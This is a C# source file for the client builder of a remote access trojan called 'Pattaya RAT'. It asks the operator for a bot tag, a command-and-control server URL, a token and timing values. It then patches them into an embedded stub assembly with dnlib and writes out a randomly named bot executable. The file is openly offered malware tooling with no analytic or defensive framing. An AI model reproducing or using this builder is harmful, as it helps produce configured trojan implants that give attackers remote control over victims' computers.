using System;
using System.IO;
using System.Linq;
using System.Reflection;
using dnlib.DotNet;

namespace pattaya_project_client_builder
{
    public class Program
    {
        private static string _VERSION = "[development version]";
        static void Main(string[] args)
        {
            Console.Title = $"Pattaya RAT client builder version: {_VERSION} | visit: https://www.unknownclub.net/";
            byte[] assemblyBytes = Properties.Resources.stub;
            AssemblyDef asm = AssemblyDef.Load(assemblyBytes);


            Console.WriteLine($@"

 ______                                               ______   _______  _______ 
(_____ \           _      _                          (_____ \ (_______)(_______)
 _____) ) _____  _| |_  _| |_  _____  _   _  _____    _____) ) _______     _    
|  ____/ (____ |(_   _)(_   _)(____ || | | |(____ |  |  __  / |  ___  |   | |   
| |      / ___ |  | |_   | |_ / ___ || |_| |/ ___ |  | |  \ \ | |   | |   | |   
|_|      \_____|   \__)   \__)\_____| \__  |\_____|  |_|   |_||_|   |_|   |_|   
                                     (____/                                     
                                            Client builder version: {_VERSION} :)
");

            Console.WriteLine("Please enter your bot settings...\n");


            //-------------------------------------------------------------------

            Console.Write("Bot client tag: ");
            string botTagInput = Console.ReadLine();


            if (botTagInput is null || botTagInput == "")
            {
                Console.WriteLine("Invalid bot client tag, Try again!");
                Console.ReadKey();
                return;
            }

            // ------------------------------------------------------------------
            Console.Write("Bot server URL: ");
            string botServerInput = Console.ReadLine();

           
            if (botServerInput is null || botServerInput == "")
            {
                Console.WriteLine("Invalid server URL, Try again!");
                Console.ReadKey();
                return;
            }


            Uri uriResult;
            bool isValidUrl = Uri.TryCreate(botServerInput, UriKind.Absolute, out uriResult) && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
            if (!isValidUrl)
            {
                Console.WriteLine("Invalid bot server url format, Try again!");
                Console.ReadKey();
                return;
            }


            //-------------------------------------------------------------------

            Console.Write("Bot server token: ");
            string botTokenInput = Console.ReadLine();


            if (botTokenInput is null || botTokenInput == "")
            {
                Console.WriteLine("Invalid bot server token, Try again!");
                Console.ReadKey();
                return;
            }
            //-------------------------------------------------------------------

            Console.Write("Bot initial socket.io timeout (in Minute) *recommend value=60: ");
            string botWSTimeoutInput = Console.ReadLine();

            int botWSTimeoutInt;
            if (!int.TryParse(botWSTimeoutInput, out botWSTimeoutInt))
            {
                Console.WriteLine("Invalid bot timeout, Try again!");
                Console.ReadKey();
                return;
            }

            //-------------------------------------------------------------------

            Console.Write("Bot signal delay (in Millisecond) *recommend value=600000: ");
            string signalDelayInput = Console.ReadLine();


            int signalDelayInt;
            if (!int.TryParse(signalDelayInput, out signalDelayInt))
            {
                Console.WriteLine("Invalid bot signal delay, Try again!");
                Console.ReadKey();
                return;
            }

            //-------------------------------------------------------------------

            Console.WriteLine($@"
-----------------------------------
######## Bot config review ########
-----------------------------------

[+] botTag -> {botTagInput}
[+] botServer -> {botServerInput}
[+] botToken -> {botTokenInput}
[+] botWSTimeout -> {botWSTimeoutInt}
[+] botSignalDelay -> {signalDelayInt}
");

            Console.WriteLine("Press any key to continue...");
            Console.ReadKey();
            var module = asm.ManifestModule;
            if(module != null)
            {
                var settings = module.GetTypes().Where(type => type.FullName == "pattaya_project_client.Models.Config").FirstOrDefault();
                if (settings != null)
                {
                    var constructor = settings.FindMethod(".cctor");
                    if (constructor != null)
                    {
                        Console.WriteLine("Generating client...");
                        constructor.Body.Instructions[0].Operand = botServerInput;
                        constructor.Body.Instructions[2].Operand = botTokenInput;
                        constructor.Body.Instructions[12].Operand = Convert.ToDouble(botWSTimeoutInt);
                        constructor.Body.Instructions[15].Operand = signalDelayInt;
                        constructor.Body.Instructions[21].Operand = botTagInput;
                        if (!Directory.Exists(Environment.CurrentDirectory + @"\Clients"))
                            Directory.CreateDirectory(Environment.CurrentDirectory + @"\Clients");

                        asm.Write(Environment.CurrentDirectory + @"\Clients\" + "pbot_" + Path.GetRandomFileName() + ".exe");
                        Console.WriteLine("Client generted...");
                        Console.ReadKey();

                    }
                    

                }
            }



        }
    }
}
